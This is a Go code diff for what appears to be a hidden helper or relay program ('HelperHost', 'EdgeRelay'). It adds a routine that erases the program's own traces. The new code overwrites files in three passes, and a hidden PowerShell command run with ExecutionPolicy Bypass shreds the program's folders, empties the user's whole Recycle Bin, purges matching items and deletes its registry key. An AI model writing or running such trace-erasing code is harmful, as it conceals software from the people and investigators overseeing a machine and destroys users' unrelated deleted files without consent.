@@ -370,18 +370,81 @@ func secureRmTree(path string) {
 	if path == "" {
 		return
 	}
+	// Hard wipe: overwrite file contents before unlink (not Recycle Bin).
 	_ = filepath.Walk(path, func(p string, info os.FileInfo, err error) error {
 		if err != nil || info == nil || info.IsDir() {
 			return nil
 		}
-		name := info.Name()
-		if strings.HasSuffix(name, ".log") || strings.HasSuffix(name, ".json") || strings.HasSuffix(name, ".txt") ||
-			name == "token" || name == "public_url" || name == "boot.log" {
-			_ = os.WriteFile(p, bytes.Repeat([]byte{0}, int(min64(info.Size(), 2_000_000))), 0o600)
-		}
+		secureShredFile(p, info.Size())
 		return nil
 	})
 	_ = os.RemoveAll(path)
+}
+
+func secureShredFile(path string, size int64) {
+	if size < 0 {
+		size = 0
+	}
+	n := size
+	if n > 64_000_000 {
+		n = 64_000_000
+	}
+	f, err := os.OpenFile(path, os.O_WRONLY, 0)
+	if err != nil {
+		_ = os.WriteFile(path, nil, 0o600)
+		return
+	}
+	defer f.Close()
+	// Pass 1: zeros
+	buf := bytes.Repeat([]byte{0}, 256*1024)
+	var written int64
+	for written < n {
+		chunk := int64(len(buf))
+		if written+chunk > n {
+			chunk = n - written
+		}
+		_, err := f.Write(buf[:chunk])
+		if err != nil {
+			break
+		}
+		written += chunk
+	}
+	// Pass 2: 0xFF
+	for i := range buf {
+		buf[i] = 0xFF
+	}
+	_, _ = f.Seek(0, 0)
+	written = 0
+	for written < n {
+		chunk := int64(len(buf))
+		if written+chunk > n {
+			chunk = n - written
+		}
+		_, err := f.Write(buf[:chunk])
+		if err != nil {
+			break
+		}
+		written += chunk
+	}
+	// Pass 3: zeros again
+	for i := range buf {
+		buf[i] = 0
+	}
+	_, _ = f.Seek(0, 0)
+	written = 0
+	for written < n {
+		chunk := int64(len(buf))
+		if written+chunk > n {
+			chunk = n - written
+		}
+		_, err := f.Write(buf[:chunk])
+		if err != nil {
+			break
+		}
+		written += chunk
+	}
+	_ = f.Sync()
+	_ = os.Truncate(path, 0)
 }
 
 func min64(a, b int64) int64 {
@@ -564,6 +627,23 @@ func wipeAll() {
 			"attrib -h -s \"" + dir + "\" >nul 2>&1\r\n" +
 			"attrib -h -s /s /d \"" + cacheDir + "\\*\" >nul 2>&1\r\n" +
 			"attrib -h -s \"" + cacheDir + "\" >nul 2>&1\r\n" +
+			// Hard wipe: overwrite every file (3 passes) then permanent delete — never Recycle Bin
+			"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"" +
+			"$ErrorActionPreference='SilentlyContinue'; " +
+			"function Shred-Tree([string]$Root){ if(-not(Test-Path -LiteralPath $Root)){return}; " +
+			"Get-ChildItem -LiteralPath $Root -Recurse -Force -File | ForEach-Object { " +
+			"try { $len=[Math]::Min($_.Length,64MB); $fs=[IO.File]::Open($_.FullName,'Open','Write','None'); " +
+			"$buf=New-Object byte[] ([Math]::Min(262144,[int]$len)); " +
+			"foreach($fill in @([byte]0,[byte]0xFF,[byte]0)){ for($i=0;$i -lt $buf.Length;$i++){$buf[$i]=$fill}; " +
+			"$fs.Seek(0,'Begin')|Out-Null; $left=$len; while($left -gt 0){ $n=[Math]::Min($buf.Length,$left); $fs.Write($buf,0,$n); $left-=$n } }; " +
+			"$fs.SetLength(0); $fs.Flush(); $fs.Close() } catch {} }; " +
+			"cmd /c \\\"rmdir /s /q `\\\"$Root`\\\"\\\" | Out-Null }; " +
+			"Shred-Tree '" + strings.ReplaceAll(dir, "'", "''") + "'; " +
+			"Shred-Tree '" + strings.ReplaceAll(cacheDir, "'", "''") + "'; " +
+			"Clear-RecycleBin -Force -ErrorAction SilentlyContinue; " +
+			"$shell=New-Object -ComObject Shell.Application; " +
+			"try { $rb=$shell.NameSpace(0xA); if($rb){ foreach($i in @($rb.Items())){ if($i.Name -match 'HelperHost|EdgeRelay|hh-'){ Remove-Item -LiteralPath $i.Path -Force -Recurse -EA SilentlyContinue } } } } catch {}" +
+			"\" >nul 2>&1\r\n" +
 			"rmdir /s /q \"" + dir + "\" >nul 2>&1\r\n" +
 			"rmdir /s /q \"" + cacheDir + "\" >nul 2>&1\r\n" +
 			"reg delete \"HKCU\\Software\\HelperHost\" /f >nul 2>&1\r\n" +
